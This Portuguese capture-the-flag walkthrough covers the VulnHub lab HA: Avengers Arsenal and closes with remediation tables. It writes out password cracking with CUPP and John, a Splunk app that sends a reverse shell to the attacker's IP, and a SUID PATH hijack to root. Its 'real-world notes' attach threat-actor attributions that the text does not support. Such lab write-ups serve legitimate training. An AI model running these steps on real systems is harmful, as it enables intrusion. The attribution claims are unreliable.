# HA: Avengers Arsenal — Monte a Cadeia de Ataque

Os heróis mais poderosos da Terra deixaram as armas espalhadas no servidor com a pior segurança imaginável. HA: Avengers Arsenal é um CTF de múltiplas flags que comprime cinco técnicas completamente distintas em uma máquina: histórico `.git` exposto com flag em Base64, esteganografia de espaço em branco via Spammimic, geração de wordlist com CUPP para quebrar zip e PDF, credenciais Splunk em hex escondidas no source HTML, e um binário SUID com PATH hijacking. Cinco flags, cinco técnicas completamente diferentes. Sólido demais, mano, essa máquina é um tour pelo skillset de CTF. Top demais.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Avengers Arsenal |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-avengers-arsenal,419/ |
| **Técnicas** | Histórico .git exposto, análise de commits git, decodificação Base64, brute-force de diretórios, escaneamento de QR code, esteganografia de espaço em branco Spammimic, geração de wordlist direcionada CUPP, quebra de senha zip/PDF (John the Ripper), mineração de credenciais em source HTML, decodificação hex, RCE Splunk via splunk_shells, PATH hijacking SUID, célula de planilha oculta |
| **CVEs** | CWE-538 (Diretório .git exposto), CWE-522 (Credenciais Inadequadamente Protegidas em hex no HTML), CWE-732 (Atribuição Incorreta de Permissão para Recurso Crítico: binário SUID com PATH relativo) |
| **Grupos APT** | APT41 — usou acesso de administrador Splunk para vigilância persistente em ambientes corporativos; FIN7 — explorou configurações incorretas de SUID em sistemas Linux para movimento lateral; APT28 — exfiltração de repositórios git para coletar segredos históricos |

---

## Resumo do Ataque

```
nmap → HTTP (80), Splunk (8000, 8089)
  → /.git/ exposto → git clone repo GitHub → git log → base64 → FLAG 1 (Escudo do Cap)
  → dirb → /images/ → 17.jpeg (QR code) → escaneio → "spammimc"
  → /spammimc/ → sceptre.txt (esteg. espaço em branco) → decodificação Spammimic → FLAG 2 (Cetro de Loki)
  → /groot/ → hammer.zip → PDF protegido por senha
  → /avengersbook.html → perfil Tony Stark → CUPP → tony.txt
  → zip2john + john --wordlist=tony.txt → Stark12008
  → pdf2john + john --wordlist=tony.txt → Tony_050081 → PDF → FLAG 3 (Mjølnir do Thor)
  → source HTML de / → comentário hex: 6167656e743a6176656e67657273
  → xxd -r -p → agent:avengers → login Splunk
  → upload app splunk_shells → | revshell std ATACANTE 1234 → shell
  → find SUID → /opt/ignite → strings → chama ifconfig (relativo)
  → echo "/bin/bash" > /tmp/ifconfig → PATH=/tmp:$PATH → /opt/ignite → root
  → /root/final.txt → FLAG 4 (Storm Breaker)
  → /opt/yaka.xlsx → célula N20 → FLAG 5 (Planilha)
```

---

## Metodologia

1. Scan completo de portas: identificar HTTP e portas web/gerenciamento Splunk
2. Diretório `.git/` exposto: extrair referência GitHub e extrair flag do histórico de commits
3. Brute-force de diretórios: descobrir caminho de imagem oculta, QR code, texto esteganográfico
4. Esteganografia de espaço em branco: decodificação Spammimic para segunda flag
5. Geração de wordlist baseada em perfil com CUPP: quebrar senhas de zip e PDF
6. Mineração de source HTML: decodificação hex de credenciais Splunk
7. RCE Splunk: upload do app `splunk_shells`, acionar shell reverso
8. PATH hijacking SUID: abusar de `/opt/ignite` chamando `ifconfig` por caminho relativo
9. Análise de planilha: conteúdo de célula oculta

---

## Passo 1 — Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -A -p- 192.168.1.101
```

Portas abertas:
- **80/tcp** — HTTP (Apache)
- **8000/tcp** — interface web Splunk
- **8089/tcp** — interface de gerenciamento Splunk

O scan também revela um diretório `.git/` e caminho `/groot` na porta 80. ᕕ( ᐛ )ᕗ

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Flag 1: Exfiltração de Repositório Git (Escudo do Capitão América)

O diretório `.git/` está publicamente acessível via porta 80. Em vez de um dump completo com GitTools, o `HEAD` exposto referencia um repositório GitHub diretamente:

```bash
curl -s http://192.168.1.101/.git/HEAD
curl -s http://192.168.1.101/.git/config
# [remote "origin"] url = https://github.com/Hackingzone/hackingarticles.git
```

Clone o repositório referenciado:

```bash
git clone https://github.com/Hackingzone/hackingarticles.git
cd hackingarticles/
git log --oneline
git show 4fb65717a4bdfa8169fb0642abf0f355f7eea048
```

O commit contém uma string codificada em Base64:

```bash
echo "Q2FwdGFpbiBBbWVyaWNhJ3MgU2hpZWxkOnswNjE3ODZEOUE4QkI4OUEyRkU3NDVERDI2RkUyRTEzQ30=" | base64 -d
```

Saída: **Flag 1 — Escudo do Capitão América: {061786D9A8BB89A2FE74DED26FE2E13C}**

**Nota do mundo real:** O APT28 rotineiramente clona repositórios GitHub referenciados por desenvolvedores para coletar credenciais e dados sensíveis commitados em commits "fix", "cleanup" ou "remove hardcoded". O programa GitHub Secret Scanning intercepta mais de 1 milhão de segredos por ano, principalmente em repositórios públicos.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos (histórico VCS); T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Flag 2: Esteganografia de Espaço em Branco (Cetro de Loki)

Faça brute-force do web root:

```bash
dirb http://192.168.1.101/ \
  /usr/share/wordlists/dirb/common.txt
```

Descoberto: `/images/`. Navegue até ele e procure arquivos não listados:

```bash
curl -s http://192.168.1.101/images/ | grep -i "\.jpeg\|\.png\|\.gif"
```

Encontrado: `17.jpeg`, uma imagem QR code não vinculada de nenhuma página. Escaneie:

```bash
zbarimg http://192.168.1.101/images/17.jpeg
# Saída: "spammimc"
```

Navegue para `http://192.168.1.101/spammimc/` e encontre `sceptre.txt`. O arquivo parece em branco. É esteganografia de espaço em branco:

**O que é Spammimic?** O Spammimic codifica dados binários como texto aparentemente em branco usando padrões de espaços e tabulações. Parece vazio mas carrega dados codificados. Decodifique em `https://www.spammimic.com/decode.shtml`, cole o conteúdo do arquivo.

```bash
curl -s http://192.168.1.101/spammimc/sceptre.txt | wc -c
# Não-zero apesar de parecer em branco, confirma esteganografia
```

Cole no decodificador Spammimic → **Flag 2 — Cetro de Loki**

**MITRE ATT&CK:** T1027 — Arquivos e Informações Ofuscadas (esteganografia); T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Flag 3: CUPP + Quebra de Senha Direcionada (Mjølnir do Thor)

`/groot/` contém `hammer.zip`, um arquivo protegido por senha com um PDF dentro.

A página `/avengersbook.html` é um perfil falso de rede social do Tony Stark com dados biográficos. CUPP (Common User Passwords Profiler) gera wordlists direcionadas a partir de informações pessoais:

```bash
cd /opt/cupp
python3 cupp.py -i
```

Preencha os detalhes do Tony Stark de `/avengersbook.html`:
- Primeiro nome: tony
- Sobrenome: stark
- Apelido: ironman
- Data de nascimento: 01052008 (1 de maio de 2008, lançamento do Homem de Ferro)

CUPP gera `tony.txt` com centenas de permutações de senha.

**Quebre o zip:**

```bash
zip2john hammer.zip > zip_hash.txt
john --wordlist=/opt/cupp/tony.txt zip_hash.txt
# Senha: Stark12008
```

Extraia o PDF do zip, depois quebre o PDF:

```bash
unzip -P Stark12008 hammer.zip
pdf2john Mjolnir.pdf > pdf_hash.txt
john --wordlist=/opt/cupp/tony.txt pdf_hash.txt
# Senha: Tony_050081
```

Abra o PDF com `Tony_050081` para recuperar a **Flag 3 — Mjølnir do Thor**

**Nota do mundo real:** Wordlists direcionadas estilo CUPP são um padrão em testes de penetração corporativos, mano. Funcionários rotineiramente usam combinações do nome, data de nascimento, nome da empresa e ano. FIN7 usou técnicas similares em sistemas de RH para quebrar senhas de contas de funcionários nas campanhas de 2018 contra Chipotle e Arby's.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha; T1589.001 — Coletar Informações de Identidade da Vítima: Credenciais

---

## Passo 5 — Credenciais Splunk em Hex no Source HTML

Acesse `http://192.168.1.101/` e veja o source:

```bash
curl -s http://192.168.1.101/ | grep "<!--"
```

Um comentário contém uma string codificada em hex:

```bash
echo "6167656e743a6176656e67657273" | xxd -r -p
# agent:avengers
```

Faça login no Splunk em `http://192.168.1.101:8000` com `agent:avengers`.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1027 — Arquivos e Informações Ofuscadas (codificação hex)

---

## Passo 6 — Shell Reverso via Splunk

**O que é a capacidade de shell reverso do Splunk?** O Splunk processa consultas de pesquisa usando seu próprio motor de scripting. Quando um app fornece comandos de pesquisa personalizados respaldados por scripts de sistema, esses scripts executam com os privilégios do processo Splunk. O pacote comunitário `splunk_shells` adiciona um comando de pesquisa `revshell` que gera um shell reverso.

Baixe `splunk_shells` do GitHub (TBGSecurity/splunk_shells).

Na UI web do Splunk:
1. Navegue para **Apps → Gerenciar Apps → Instalar app de arquivo**
2. Faça upload do pacote `splunk_shells.tar.gz`
3. Reinicie o Splunk quando solicitado
4. Configure permissões do app: leitura por todos, contexto "Todos os apps"

Inicie o listener:
```bash
nc -lvnp 1234
```

Na barra de pesquisa do Splunk:
```
| revshell std 192.168.1.107 1234
```

Shell conecta. Estabilize:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell; T1190 — Exploração de Aplicação Pública

---

## Passo 7 — Flag 4: PATH Hijacking SUID (Storm Breaker)

Enumere binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Encontrado: `/opt/ignite`. Inspecione:

```bash
strings /opt/ignite | grep -v "^$"
```

`/opt/ignite` chama `ifconfig` por caminho relativo (sem `/sbin/ifconfig`). Isso significa que ele busca `ifconfig` no `$PATH` do shell.

**O que é PATH hijacking?** Quando um binário SUID chama um programa pelo nome relativo, o SO procura nos diretórios do `$PATH` em ordem. Ao preficar um diretório que controlamos, podemos substituir nosso próprio executável `ifconfig` que roda como root:

```bash
cd /tmp
echo "/bin/bash" > ifconfig
chmod 777 ifconfig
export PATH=/tmp:$PATH
/opt/ignite
id
# uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/final.txt
# FLAG 4 — Storm Breaker
```

**Nota do mundo real:** GTFOBins e o OWASP Testing Guide documentam PATH hijacking para binários SUID, caramba. FIN7 usou essa técnica em ambientes Linux para escalonar de contexto de servidor web para root durante as campanhas no setor de hotelaria.

**MITRE ATT&CK:** T1574.007 — Sequestro de Fluxo de Execução: Interceptação de PATH via Variável de Ambiente; T1548.001 — Abuso de Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Passo 8 — Flag 5: Célula de Planilha Oculta

Em `/opt/` encontre `yakahints.txt` e `yaka.xlsx`:

```bash
cat /opt/yakahints.txt
# "Guardians of The Galaxy Vol. 1 Release date is 20 14"
```

A dica: linha 20, coluna 14. Copie a planilha:

```bash
cp /opt/yaka.xlsx /var/www/html/
```

Baixe para a máquina atacante:
```bash
wget http://192.168.1.101/yaka.xlsx
```

Abra no LibreOffice Calc. A planilha parece em branco. Navegue para a célula **N20** (coluna 14, linha 20). A flag é visível na barra de fórmulas, oculta por fonte branca em fundo branco.

**Flag 5 — flag da planilha**

**MITRE ATT&CK:** T1027 — Arquivos e Informações Ofuscadas (conteúdo de célula oculto)

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Crackeado/Usado |
|---|---|---|---|
| Flag 1 | Escudo do Cap.: {061786D9A8BB89A2FE74DED26FE2E13C} | Histórico de commits GitHub (decodificação Base64) | Leitura |
| Flag 2 | Cetro de Loki | /spammimc/sceptre.txt (decodificação Spammimic) | Decodificado |
| Flag 3 | Mjølnir do Thor | Mjolnir.pdf em hammer.zip (senha zip: Stark12008, PDF: Tony_050081) | CUPP + John |
| Credencial | agent:avengers | decodificação hex no source HTML | Login Splunk |
| Flag 4 | Storm Breaker | /root/final.txt | PATH hijack SUID |
| Flag 5 | Flag da planilha | /opt/yaka.xlsx célula N20 | LibreOffice Calc |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | `.git/` exposto + referência a repo GitHub | Deployments de produção que copiam árvores fonte expõem histórico completo incluindo segredos deletados | Bloqueie `/.git/` no web server; faça deploy apenas de artefatos; use GitHub Secret Scanning |
| 2 | Esteganografia de espaço em branco em arquivo de texto "em branco" | Comunicação por canal encoberto usando codificação de espaço em branco aparece em relatórios de inteligência de ameaças | Detecção de anomalia de conteúdo de arquivo: verifique tamanho do arquivo versus conteúdo visual |
| 3 | Wordlist CUPP direcionada quebra zip/PDF | Testes de penetração corporativos regularmente quebram senhas de funcionários usando CUPP com dados de perfil do LinkedIn | Enforce gerenciadores de senha; proíba dados pessoais em senhas; use credenciais geradas aleatoriamente |
| 4 | Credenciais Splunk em comentário HTML (hex) | Múltiplas intrusões do APT41 aproveitaram acesso admin Splunk comprometido para manipulação de logs e vigilância | Admin Splunk requer MFA; sem credenciais no HTML; restrinja Splunk a redes de gerenciamento |
| 5 | Binário SUID chamando ifconfig por caminho relativo | PATH hijacking via SUID é um privesc bem conhecido em ambientes Linux corporativos | Audite binários SUID regularmente; use caminhos absolutos em todos os binários SUID |

---

## MITRE ATT&CK Mapping

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (VCS) | T1552.001 |
| Evasão de Defesa | Evasão de Defesa | Arquivos e Informações Ofuscadas | T1027 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (Splunk) | T1190 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Setuid e Setgid | T1548.001 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Sequestro de Fluxo: Interceptação de PATH | T1574.007 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Bloqueie `/.git/` no nível do web server** — Nginx: `location ~ /\.git { deny all; }` — nunca exponha histórico de repositório
2. **Rotacione todos os segredos no histórico do repo GitHub** — `git filter-repo` para purgar, então force-push; trate o histórico como público
3. **Remova credenciais do source HTML** — nunca armazene credenciais em comentários; use gerenciamento de segredos server-side (Vault, AWS Secrets Manager)
4. **Enforce MFA no Splunk e restrinja a porta de gerenciamento 8089 por IP** — acesso admin Splunk = RCE no nível do SO; trate como crítico
5. **Audite todos os binários SUID** — `find / -perm -u=s -type f 2>/dev/null`; remova o bit SUID de binários não essenciais; substitua caminhos relativos por absolutos em binários SUID
6. **Desabilite upload de plugin/app no Splunk** se não for necessário para operações

### Se Você Encontrar Isso no Seu Ambiente

- Remova quaisquer apps não autorizados do Splunk; verifique `$SPLUNK_HOME/etc/apps/` por entradas desconhecidas
- Rotacione imediatamente as credenciais `agent:avengers` do Splunk
- Audite `find / -perm -u=s` e verifique que cada binário SUID é intencional
- Verifique `.git/config` por referências a repositórios externos que expõem dados internos

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Auditar diretórios `.git/` expostos na web; inventariar binários SUID |
| Proteger | Controle de Acesso | MFA para admin Splunk; restringir portas de gerenciamento a IPs confiáveis |
| Proteger | Segurança de Dados | Remover credenciais do HTML; bloquear acesso a `.git/` |
| Detectar | Anomalias e Eventos | Alertar sobre uploads de apps Splunk; monitoramento de execução de binários SUID |
| Responder | Planejamento de Resposta | Remover apps Splunk não autorizados; rotacionar credenciais; remover SUID de binários afetados |
| Recuperar | Planejamento de Recuperação | Reconstruir configuração Splunk a partir de estado limpo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir interface de gerenciamento Splunk a intervalos de IP confiáveis |
| AC-6 | Menor Privilégio | Remover bit SUID de binários não essenciais; restringir privilégios de usuário Splunk |
| IA-2(1) | Autenticação Multifator | MFA para todas as contas admin Splunk |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar credenciais Splunk; sem credenciais no HTML |
| CM-7 | Funcionalidade Mínima | Bloquear acesso web a `.git/`; desabilitar upload de app Splunk se não necessário |
| SI-7 | Integridade de Software | Auditar apps Splunk regularmente; monitorar por instalações não autorizadas |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Autenticação | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Reflexão Final

HA: Avengers Arsenal é uma das máquinas mais criativas da série HA. Cinco técnicas completamente diferentes, cada uma tematizada em torno de uma arma de um Vingador diferente: o design é inteligente e a variedade faz isso ser um excelente amostrador de habilidades para praticantes intermediários.

A flag do Spammimic é particularmente inspirada: esteganografia de espaço em branco é uma técnica real usada na comunicação de atores de ameaças, e vê-la em um contexto de CTF é genuinamente educacional. A flag do CUPP ensina o valor da geração de wordlist orientada por OSINT, uma habilidade que se traduz diretamente para pentesting corporativo.

Parabéns ao criador por colocar tanto em uma única máquina. É nóis! ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
